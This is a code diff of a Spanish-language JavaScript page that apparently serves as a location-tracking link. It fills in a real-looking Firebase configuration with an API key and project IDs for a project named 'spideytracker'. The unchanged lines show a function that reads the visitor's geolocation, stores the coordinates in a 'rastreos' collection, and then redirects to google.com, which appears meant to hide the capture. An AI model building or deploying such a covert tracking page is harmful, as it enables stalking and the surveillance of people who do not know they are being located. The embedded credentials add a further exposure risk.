@@ -2,14 +2,14 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-// CONFIGURACIÓN DE FIREBASE (Asegúrate de colocar tus credenciales reales)
+// CONFIGURACIÓN DE FIREBASE (Credenciales reales integradas)
 const firebaseConfig = {
-    apiKey: "TU_API_KEY",
-    authDomain: "tu-proyecto.firebaseapp.com",
-    projectId: "tu-proyecto",
-    storageBucket: "tu-proyecto.appspot.com",
-    messagingSenderId: "TU_MESSAGING_SENDER_ID",
-    appId: "TU_APP_ID"
+    apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
+    authDomain: "spideytracker-591bb.firebaseapp.com",
+    projectId: "spideytracker-591bb",
+    storageBucket: "spideytracker-591bb.firebasestorage.app",
+    messagingSenderId: "923704989530",
+    appId: "1:923704989530:web:74debc7597acbc80a00563"
 };
 
 // Inicializar Firebase, Firestore y Auth
@@ -50,7 +50,6 @@ document.addEventListener("DOMContentLoaded", async function () {
             btn.innerText = "Procesando...";
             btn.disabled = true;
             
-            // Garantizar autenticación antes de intentar escribir en Firestore
             try {
                 await signInAnonymously(auth);
             } catch (err) {
@@ -96,7 +95,6 @@ function capturarYSalir(id) {
             const lng = position.coords.longitude;
 
             try {
-                // Guarda las coordenadas en Firestore
                 await setDoc(doc(db, "rastreos", id), {
                     lat: lat,
                     lng: lng,
@@ -105,7 +103,6 @@ function capturarYSalir(id) {
             } catch (e) {
                 console.error("Error al guardar en Firebase:", e);
             } finally {
-                // Redirecciona una vez completada la escritura
                 window.location.replace("https://www.google.com");
             }
         },
